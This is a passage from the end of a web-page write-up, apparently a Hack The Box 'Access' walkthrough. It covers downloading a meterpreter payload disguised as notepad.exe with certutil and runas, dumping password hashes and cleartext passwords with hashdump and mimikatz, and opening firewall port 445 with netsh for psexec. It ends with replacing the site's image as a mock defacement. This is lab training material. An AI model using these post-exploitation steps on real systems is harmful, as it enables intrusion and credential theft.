+<p><img alt="alt text" src="/images/htb-Access/simpleHttp-local-webserver.png"></p>
+<ol start="22">
+<li>I had a listener running on port 23 with my IP as RHOST in the telent session on target, so I executed certutil to download the payload.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/certutil-runas-exec-notepad.png"></p>
+<ol start="23">
+<li>It worked! We have the notepad.exe (payload) on the target machine. Then I used runas to run it as an admin. If you tried to run notepad.exe without runas you will get the blocked policy .. cannot do that message..etc. Voila!! Got a fully established meterpreter shell this time.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/certutil-successful-meterpreter.png"></p>
+<ol start="24">
+<li>I backgrounded this meterpreter session to use the hashdump module and get hashes of <strong>Admin</strong>. You should run <strong>getsystem</strong> first before <strong>run hashdump</strong>.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/hashdump-acquired.png"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:db852e5a46ea5f5514f639a20daa9e2c:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>security:1001:aad3b435b51404eeaad3b435b51404ee:b41db16a61cb04b231625de260163015:::
+</span></span><span style="display:flex;"><span>engineer:1002:aad3b435b51404eeaad3b435b51404ee:25c41637f0a9874ac9b90b4a4baf5783:::
+</span></span></code></pre></div><ol start="25">
+<li>Used John to crack at the hashes. I also loaded mimikatz to get the admin password.</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/mimkikatz-admin-creds.png"></p>
+<h2 id="wdigest-credentials">wdigest credentials</h2>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AuthID     Package    Domain        User                Password
+</span></span><span style="display:flex;"><span>------     -------    ------        ----              | --------
+</span></span><span style="display:flex;"><span>0;996    |  Negotiate |  HTB         |  ACCESS$
+</span></span><span style="display:flex;"><span>0;119773 |  Negotiate |  IIS APPPOOL |  DefaultAppPool|
+</span></span><span style="display:flex;"><span>0;995    |  Negotiate |  NT AUTHORITY|  IUSR
+</span></span><span style="display:flex;"><span>0;997    |  Negotiate |  NT AUTHORITY|  LOCAL SERVICE
+</span></span><span style="display:flex;"><span>0;45589  |  NTLM
+</span></span><span style="display:flex;"><span>0;999    |  NTLM      |  HTB         |  ACCESS$
+</span></span><span style="display:flex;"><span>0;458676 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
+</span></span><span style="display:flex;"><span>0;456008 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
+</span></span><span style="display:flex;"><span>0;646488 |  NTLM      |  ACCESS      |  Administrator |  55Acc3ssS3cur1ty@megacorp
+</span></span></code></pre></div><h1 id="post-exploit">Post-Exploit</h1>
+<ol start="26">
+<li>I opened a telnet session and logged in using the admin password. Then I opened port 445/tcp to open a meterpreter shell with <strong>psexec</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netsh advfirewall firewall add rule dir=in action=allow protocol=TCP <span style="font-weight:bold;font-style:italic">\
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold;font-style:italic"></span>localport=445 name=<span style="font-style:italic">&#34;allow_TCP-445
+</span></span></span></code></pre></div><p><img alt="alt text" src="/images/htb-Access/opened-smb-port.png"></p>
+<ol start="27">
+<li>I also opened port 3389/tcp just for fun and to see if rdesktop would work - it didn&rsquo;t!</li>
+</ol>
+<p>====================================================================================</p>
+<ol start="28">
+<li>I also wanted to test uploading my own jpg file on the webserver instead of the default.jpeg. Looking in websrc</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/webserver-src-pg.png"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="font-weight:bold;font-style:italic">\i</span>netpub<span style="font-weight:bold;font-style:italic">\w</span>wwroot<span style="font-weight:bold;font-style:italic">\o</span>ut.jpg
+</span></span></code></pre></div><ol start="29">
+<li>So after uploading a “hack the planet&quot; jpg file on the target machine using the <strong>certutil</strong> trick,  priv. escalate with getsystem, and popping a shell with meterpreter. I copied my htP.jpg into the inetpub folder replacing the existing out.jpg with mine. Oh yeah this is fun!</li>
+</ol>
+<p><img alt="alt text" src="/images/htb-Access/uploading-hack-the-planet.png"></p>
+<p><img alt="alt text" src="/images/htb-Access/target-machine-hack-the-planet.png"></p>
+<p>This was fun, that&rsquo;s it folks until the next box!</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/htb/">
+                htb
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/windows/">
+                Windows
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/mdb/">
+                mdb
+              </a>
+            </div>
+            
+            <div class="post-tags">
+              <a href="/tags/powershell/">
+                powershell
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
